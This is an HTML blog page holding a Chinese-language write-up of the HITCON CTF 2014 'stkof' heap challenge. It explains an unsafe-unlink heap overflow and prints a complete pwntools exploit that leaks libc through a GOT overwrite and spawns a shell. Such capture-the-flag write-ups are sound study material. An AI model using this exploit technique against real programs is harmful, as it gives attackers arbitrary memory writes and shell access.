@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://juniorprincewang.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","width":320,"display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":true,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="how2heap之unsafe unlink的应用实战，加深对其理解。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hitcon-ctf-2014&#x2F;stkof writeup">
+<meta property="og:url" content="http://juniorprincewang.github.io/2017/09/16/hitcon-ctf-2014-stkof-writeup/index.html">
+<meta property="og:site_name" content="TO DO">
+<meta property="og:description" content="how2heap之unsafe unlink的应用实战，加深对其理解。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-09-16T04:03:19.000Z">
+<meta property="article:modified_time" content="2021-03-26T11:25:06.947Z">
+<meta property="article:author" content="Max">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://juniorprincewang.github.io/2017/09/16/hitcon-ctf-2014-stkof-writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>hitcon-ctf-2014/stkof writeup | TO DO</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="/custom_css_source.css">
+<!-- hexo injector head_end end --><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">TO DO</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">吾尝终日而思矣，不如须臾之所学也。</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/juniorprincewang" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://juniorprincewang.github.io/2017/09/16/hitcon-ctf-2014-stkof-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Max">
+      <meta itemprop="description" content="文章本天成，妙手偶得之。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TO DO">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hitcon-ctf-2014/stkof writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2017-09-16 12:03:19" itemprop="dateCreated datePublished" datetime="2017-09-16T12:03:19+08:00">2017-09-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-26 19:25:06" itemprop="dateModified" datetime="2021-03-26T19:25:06+08:00">2021-03-26</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>how2heap之unsafe unlink的应用实战，加深对其理解。</p>
+<span id="more"></span>
+
+<p>例子和一些writeup可以去<a target="_blank" rel="noopener" href="https://github.com/ctfs">https://github.com/ctfs</a>里面找。<br>这道题的功能很简单，再通过IDA分析后，共有4个功能。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1	添加模块，此处分配内存，而且索引从1开始。</span><br><span class="line">2	编辑模块，此处在所分配的内存中填写信息，但是此处没有限制输入长度。</span><br><span class="line">3	删除模块，输入索引值即可删除，此处将指针置NULL。</span><br><span class="line">4	输出内容，不是输出模块内存储内容，而是判断存储内容长度来输入其他字符串。</span><br></pre></td></tr></table></figure>
+
+<p>这里存在着明显的堆溢出，但是不能使用UAF来做了，可以构造<code>shrink chunk</code>，利用<code>unsafe unlink</code>达到任意地址读写。<code>unsafe unlink</code>的利用可以参考我上一篇文章。<br>利用步骤为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 连续申请4个small chunk大小的堆,比如堆大小为0x90。</span><br><span class="line">2. 选择在.bss段上的目标地址。根据unsafe unlink,构造payload，溢出堆2，覆盖堆3的meta data。</span><br><span class="line">3. free堆3，然后我们就控制目标地址，可以对任意地址进行读写。</span><br><span class="line">4. 为了泄露出system的内存地址，我们要通过puts或write等函数输出system的内存地址，所以将puts函数入口地址覆盖掉free的got表内容。</span><br><span class="line">5. 使用DynELF找到system的内存地址。</span><br><span class="line">6. 将system的内存地址覆盖掉free的got表内容。</span><br><span class="line">7. 将&#39;&#x2F;bin&#x2F;sh&#39;写入内存并通过删除模块操作来触发system(&#39;&#x2F;bin&#x2F;sh\0&#39;)。</span><br></pre></td></tr></table></figure>
+
+<p>整体的代码为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;stkof&#39;)</span><br><span class="line">stkof_elf &#x3D; ELF(&#39;.&#x2F;stkof&#39;)</span><br><span class="line">print proc.pidof(p)[0]</span><br><span class="line">#gdb.attach(proc.pidof(p)[0], &#39;b * 0x400AE3\n b*0x400B7F&#39;)</span><br><span class="line">#pause()</span><br><span class="line">def add(len):</span><br><span class="line">    p.sendline(&#39;1&#39;)</span><br><span class="line">    p.sendline(str(len))</span><br><span class="line">    p.recvuntil(&#39;\n&#39;)</span><br><span class="line">    p.recvuntil(&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    p.sendline(&#39;3&#39;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    p.sendline(&#39;2&#39;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    #the difference between send and sendline</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    p.sendline(&#39;4&#39;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&#39;\n&#39;)</span><br><span class="line">    p.recvuntil(&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">bag&#x3D;0x0602140</span><br><span class="line">target&#x3D;bag+0x8*2</span><br><span class="line">FD&#x3D;target - 0x8*3</span><br><span class="line">BK&#x3D;target - 0x8*2</span><br><span class="line"></span><br><span class="line">free_plt &#x3D; stkof_elf.symbols[&#39;free&#39;]</span><br><span class="line">puts_plt &#x3D; stkof_elf.symbols[&#39;puts&#39;]</span><br><span class="line">free_got &#x3D; stkof_elf.got[&#39;free&#39;]</span><br><span class="line">print &#39;puts plt is &#39;+ hex(puts_plt)</span><br><span class="line">print &#39;free got is &#39;+ hex(free_got)</span><br><span class="line"></span><br><span class="line">add(0x90-8)	#1</span><br><span class="line">add(0x90-8) #2</span><br><span class="line">add(0x90-8) #3</span><br><span class="line">add(0x90-8) #4</span><br><span class="line"></span><br><span class="line">payload &#x3D; p64(0)+p64(8)+p64(FD) + p64(BK)+ 0x60*&#39;A&#39;</span><br><span class="line">payload +&#x3D; p64(0x80)+ p64(0x90)</span><br><span class="line"></span><br><span class="line">edit(2, payload)</span><br><span class="line">delete(3)</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># replace free_got by puts_plt</span><br><span class="line">edit(2, &quot;A&quot;*16+p64(free_got))</span><br><span class="line">edit(1, p64(puts_plt))</span><br><span class="line"># leak system in libc address</span><br><span class="line"></span><br><span class="line">def leak(addr):</span><br><span class="line">    edit(2, &#39;A&#39;*16+p64(addr))</span><br><span class="line">    delete(1)</span><br><span class="line">    str &#x3D; p.recvuntil(&#39;OK\n&#39;)</span><br><span class="line">    print str</span><br><span class="line">    result &#x3D; str.split(&#39;\x0aOK&#39;)[0]</span><br><span class="line">    if result&#x3D;&#x3D;&#39;&#39;:</span><br><span class="line">        return &#39;\x00&#39;</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">d &#x3D; DynELF(leak, elf&#x3D;ELF(&#39;.&#x2F;stkof&#39;))</span><br><span class="line">sys_addr &#x3D; int(d.lookup(&#39;system&#39;, &#39;libc&#39;))</span><br><span class="line"></span><br><span class="line">#libc &#x3D; stkof_elf.libc</span><br><span class="line">print hex(sys_addr)</span><br><span class="line"></span><br><span class="line">#write &#x2F;bin&#x2F;sh to memory</span><br><span class="line">edit(4, &#39;&#x2F;bin&#x2F;sh\0&#39;)</span><br><span class="line"></span><br><span class="line"># write sys_addr to free</span><br><span class="line">edit(2, &#39;A&#39;*16+p64(free_got))</span><br><span class="line">edit(1, p64(sys_addr))</span><br><span class="line"></span><br><span class="line"># trigger free(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a target="_blank" rel="noopener" href="http://blog.csdn.net/fuchuangbob/article/details/51649353">writeup hitcon-ctf-2014/stkof</a><br>[2] <a target="_blank" rel="noopener" href="http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/">CTF Writeup - HITCON CTF 2014 stkof or the “unexploitable” heap overflow ?</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/heap/" rel="tag"># heap</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/09/11/how2heap-unsafe-unlink/" rel="prev" title="how2heap之unsafe unlink">
+      <i class="fa fa-chevron-left"></i> how2heap之unsafe unlink
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2017/09/22/Plaid-CTF-2015-PlaidDB-writeup/" rel="next" title="Plaid CTF 2015- PlaidDB writeup">
+      Plaid CTF 2015- PlaidDB writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">1.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Max"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Max</p>
+  <div class="site-description" itemprop="description">文章本天成，妙手偶得之。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">86</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">92</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/juniorprincewang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;juniorprincewang" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:maxzywang@163.com" title="E-Mail → mailto:maxzywang@163.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">max</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
